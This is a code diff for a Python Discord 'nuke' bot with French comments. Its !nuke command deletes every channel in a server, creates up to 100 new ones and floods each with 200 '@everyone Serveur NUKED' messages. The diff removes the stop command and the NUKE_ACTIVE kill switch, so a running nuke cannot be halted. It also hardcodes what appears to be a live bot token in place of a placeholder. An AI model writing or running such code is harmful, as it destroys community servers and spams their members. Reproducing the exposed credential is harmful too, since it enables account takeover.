@@ -5,7 +5,7 @@ from nextcord.ext import commands
 from flask import Flask
 from threading import Thread
 
-TOKEN = "TON_TOKEN_ICI"
+TOKEN = "MTQ0MjI1MDY0OTg4NTczNjk2MQ.GpLreG.oN3WJ0myq6LWUJ9DJ-aMvJ655OyewdP4AoRxPI"
 
 app = Flask(__name__)
 
@@ -13,14 +13,11 @@ app = Flask(__name__)
 def home():
     return "Bot en ligne !"
 
-
 ALLOWED_USER = 1316068882154393693
-ALLOWED_GUILD = 1444342111653597298
+ALLOWED_GUILD = 1444350324151287882
 
 MAX_CHANNELS = 100
 SPAM_MESSAGES = 200
-
-NUKE_ACTIVE = False  # ⛔ Nouvelle variable : permet STOP NUKE
 
 intents = nextcord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
@@ -36,22 +33,9 @@ async def on_ready():
 
 
 @bot.command()
-async def stop(ctx):
-    global NUKE_ACTIVE
-    if not allowed(ctx):
-        return await ctx.send("❌ Tu n'as pas le droit d'utiliser cette commande.")
-
-    NUKE_ACTIVE = False
-    await ctx.send("🛑 **NUKE ARRÊTÉ !**")
-    
-
-@bot.command()
 async def nuke(ctx, amount: int = 5):
-    global NUKE_ACTIVE
     if not allowed(ctx):
         return await ctx.send("❌ Tu n'as pas le droit d'utiliser cette commande.")
-
-    NUKE_ACTIVE = True  # 🔥 Le nuke démarre
 
     amount = max(1, min(amount, MAX_CHANNELS))
     guild = ctx.guild
@@ -62,21 +46,17 @@ async def nuke(ctx, amount: int = 5):
     except:
         pass
 
-    # SUPPRESSION DES SALONS
+    # --- SUPPRESSION DE TOUS LES SALONS ---
     for channel in guild.channels:
-        if not NUKE_ACTIVE:
-            return await ctx.send("🛑 **NUKE STOPPÉ en pleine suppression !**")
         try:
             await channel.delete()
             await asyncio.sleep(0.1)
         except:
             pass
 
-    # CRÉATION DES SALONS
+    # --- CRÉATION DES NOUVEAUX SALONS ---
     new_channels = []
     for i in range(amount):
-        if not NUKE_ACTIVE:
-            return await ctx.send("🛑 **NUKE STOPPÉ pendant la création !**")
         try:
             c = await guild.create_text_channel(f"cheh-touxiroux-{i+1}")
             new_channels.append(c)
@@ -84,11 +64,9 @@ async def nuke(ctx, amount: int = 5):
         except:
             pass
 
-    # SPAM
+    # --- SPAM ---
     for c in new_channels:
         for _ in range(SPAM_MESSAGES):
-            if not NUKE_ACTIVE:
-                return await ctx.send("🛑 **NUKE STOPPÉ pendant le spam !**")
             try:
                 await c.send("💥@everyone Serveur NUKED💥")
                 await asyncio.sleep(0.03)
@@ -103,16 +81,14 @@ async def nuke(ctx, amount: int = 5):
 
     await ctx.send("🔥 **NUKE TERMINÉ !**")
 
-
-# LANCER FLASK
+# --- LANCER FLASK DANS UN THREAD (OK) ---
 def run_flask():
     port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
 
 Thread(target=run_flask).start()
 
-
-# LANCER NEXTCORD
+# --- LANCER NEXTCORD SUR LA BOUCLE PRINCIPALE (OBLIGATOIRE) ---
 async def main():
     await bot.start(TOKEN)
 
